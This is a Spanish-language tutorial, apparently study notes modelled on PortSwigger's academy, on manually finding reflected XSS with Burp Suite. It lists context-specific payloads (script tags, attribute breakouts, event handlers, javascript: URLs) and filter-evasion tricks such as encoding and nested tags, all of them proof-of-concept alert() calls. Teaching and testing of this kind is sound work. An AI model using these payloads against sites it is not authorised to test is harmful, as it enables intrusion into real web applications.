# Reflected XSS

# 🛡️ Guía para encontrar y probar vulnerabilidades XSS reflejadas

Esta guía tiene como objetivo ayudarte a detectar, probar y validar vulnerabilidades de **Cross-Site Scripting (XSS) reflejado** de forma manual, siguiendo las mejores prácticas y metodologías recomendadas por PortSwigger Web Security Academy.

---

## 🎯 ¿Qué es el XSS reflejado?

El **XSS reflejado** ocurre cuando una aplicación web **refleja datos de entrada no confiables en su respuesta**, sin una validación o escape adecuados. Esto permite a un atacante inyectar y ejecutar código JavaScript malicioso en el navegador de la víctima.

---

## 🧪 Pasos para encontrar y probar XSS reflejado

---

### 1. 🔍 Pruebe cada punto de entrada

Identificá todos los **puntos de entrada** que aceptan datos del usuario y son utilizados en la respuesta de la aplicación.

- Parámetros en la **URL (query strings)**  
- **Datos POST** en formularios  
- **Encabezados HTTP** como `User-Agent`, `Referer` o `X-Forwarded-For`  
- Partes de la **ruta URL**  

📦 **Herramientas recomendadas**:  
- Burp Suite → HTTP history / Target → Param guessing

---

### 2. 🎲 Envíe valores alfanuméricos aleatorios

Para cada punto de entrada, enviá un valor alfanumérico aleatorio **único**, como `abc123xy`.

- Asegurate de que:
  - Sea corto y simple (evita caracteres especiales)
  - Sea improbable que aparezca por accidente
- Luego buscá ese valor reflejado en la respuesta

📌 **Ejemplo de payload aleatorio**:
```plaintext
abc123xy
```

🧰 **Burp Intruder**:  
- Usá una lista de valores hexadecimales generados aleatoriamente  
- Configurá **grep match** para encontrar reflejos automáticamente

---

### 3. 🔍 Determine el contexto de la reflexión

Una vez identificado que el valor fue reflejado, es clave analizar **dónde** y **cómo** se refleja, ya que **el contexto define qué payload funcionará**.

📚 **Tipos de contexto comunes y su explotabilidad**:

| Contexto                        | Ejemplo                                             | ¿Explotable fácilmente? | Tip                                                         |
|---------------------------------|-----------------------------------------------------|--------------------------|-------------------------------------------------------------|
| HTML (entre etiquetas)          | `<p>abc123xy</p>`                                   | ✅ Sí                    | Podés inyectar directamente un `<script>`                  |
| Atributo HTML (entre comillas)  | `<input value="abc123xy">`                          | ⚠️ Depende               | Necesitás cerrar el atributo (`"`) y seguir con un `onerror` |
| Atributo de evento              | `<button onclick="doSomething('abc123xy')">`        | ✅ Sí                    | Podés cerrar comillas y ejecutar JS                        |
| Dentro de `<script>`            | `<script>var a = 'abc123xy'</script>`               | ✅ Con cuidado           | Necesitás cerrar comillas/línea correctamente              |
| URL                             | `<a href="/page?redir=abc123xy">`                  | ⚠️ Depende               | Útil si la URL se usa en JS sin sanitizar                 |

🧠 **Tips**:

- Usá tu valor alfanumérico (por ejemplo `abc123xy`) como búsqueda (grep) en Burp Repeater.
- Analizá si está dentro de comillas, etiquetas, atributos o scripts.
- Elegí o ajustá tu carga útil según ese contexto específico.


---

### 4. 🚀 Pruebe una carga útil candidata

Esta carga útil simple intenta ejecutar JavaScript en el navegador. Si ves un `alert()` con el dominio, ¡tenés un XSS reflejado!

#### 🧪 Usá Burp Repeater para probar la carga útil

1. Enviá la solicitud original con el valor alfanumérico (ej. `abc123xy`) al **Burp Repeater**.
2. Sustituí ese valor por una carga útil XSS candidata, por ejemplo:

```html
<script>alert(document.domain)</script>
```

3. Podés mantener el valor original junto con el payload, para facilitar el grep:

```text
abc123xy<script>alert(document.domain)</script>
```

4. En la pestaña de respuesta de Burp, usá el valor `abc123xy` como término de búsqueda (grep) para detectar en qué partes del HTML aparece reflejado.
5. Revisá el contexto en que aparece para ver si permite ejecución de código.

> 🧠 **Tip:** El contexto te ayuda a elegir una mejor carga útil. Si estás en un atributo HTML, por ejemplo, vas a necesitar cerrar comillas o inyectar en un evento.

---

### 4.1 🧩 Payloads según contexto

Cada tipo de contexto tiene sus particularidades. Acá tenés una guía para adaptar tu carga útil según cómo se refleje la entrada:

| 🧱 Contexto | 🔍 Reflejo típico | 💥 Payload base | 🧠 Tip |
|----------|-----------------------|--------------------------|-----------------------------------|
| HTML plano | `<p>abc123xy</p>` | `<script>alert(1)</script>` | Ideal para empezar |
| Atributo HTML (comillas) | `<img src="abc123xy">` | `" onerror="alert(1)` | Cerrá comillas y agregá evento |
| Atributo HTML (sin comillas) | `<img src=abc123xy>` | `onerror=alert(1)` | Sin necesidad de cerrar |
| Evento inline JS | `<button onclick="doSomething('abc123xy')">` | `');alert(1);//` | Cerrá comillas y paréntesis |
| Dentro de `<script>` | `<script>var user = 'abc123xy';</script>` | `';alert(1);//` | Cerrá string y ejecutá |
| URL (href) | `<a href="abc123xy">` | `javascript:alert(1)` | Útil si el enlace se sigue |
| URL en JS | `window.location = "abc123xy";` | `";alert(1);//` | Inyección directa |
| JSON en script | `let data = {"name":"abc123xy"}` | `"abc123xy"};alert(1);//` | Cerrá objeto y ejecutá |

---

### 🎩 Técnicas de evasión útiles

Si la carga útil es filtrada, probá con:

#### 🔐 Codificación:

```html
%3Cscript%3Ealert(1)%3C/script%3E
```

#### 🌀 Obfuscación de etiquetas:

```html
<scr<script>ipt>alert(1)</scr</script>ipt>
```

#### 🎮 Eventos menos comunes:

```html
<video><source onerror="alert(1)">
<details open ontoggle="alert(1)">
```

---

### 🧠 Tips

- Probá distintas combinaciones de **comillas**, **etiquetas**, **eventos** y **codificaciones**.
- **Grepeá tu valor de prueba** (`abc123xy`) para identificar cómo se refleja.
- Analizá el **HTML resultante en DevTools (F12)** para confirmar cómo se ve realmente la inyección.



### 5. 🧨 Pruebe cargas útiles alternativas

Si tu payload fue filtrado o alterado, intentá con variantes que **evadan validaciones**.

---

#### 🧱 Payloads por contexto:

**HTML context:**

```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```
#### 🧱 Atributo HTML:

```html
" onmouseover="alert(1)
javascript:alert(1)
```
#### 🧱 JavaScript context:

```js
';alert(1);// 
```
### 🎩 Técnicas de evasión

**🔐 Codificación:**

```html
%3Cscript%3Ealert(1)%3C/script%3E
```
### 🌀 Obfuscación

```html
<scr<script>ipt>alert(1)</scr</script>ipt>
```
### 📽️ Eventos menos comunes

```html
<video><source onerror="alert(1)">
<details open ontoggle="alert(1)">
```
### 🧠 Tips

- Probá distintas combinaciones.
- Reintentá cambiando comillas, caracteres especiales, etc.

---

### 📘 Recursos útiles

- [PayloadsAllTheThings – XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
- [PortSwigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

## 6. 🌐 Pruebe el ataque en un navegador

Una vez que tenés una carga útil que parece funcionar, verificala en un navegador real.

### 📌 Opciones:

- Copiá y pegá la URL modificada directamente en el navegador.
- Usá **Burp Proxy** para interceptar y modificar la solicitud.
- Confirmá que aparece el `alert()` en pantalla.

### ✅ Payload de prueba final:

```html
<script>alert(document.domain)</script>
```

### 🕵️ Debugging

- Usá las herramientas de desarrollador (F12) para inspeccionar el DOM.
- Verificá si el payload fue escapado o alterado.

---

### 🧠 Conclusión

Dominar el XSS reflejado requiere entender:

- Cómo se refleja la entrada del usuario.
- En qué contexto se refleja.
- Cómo adaptar tu carga útil según el contexto y los filtros.

Con práctica y una buena colección de payloads, vas a poder identificar estas vulnerabilidades rápidamente.

---

### 📚 Recursos extra

- [PortSwigger Web Security Academy – Reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected)
- [XSS Game de Google](https://xss-game.appspot.com/)
- [OWASP XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)



   
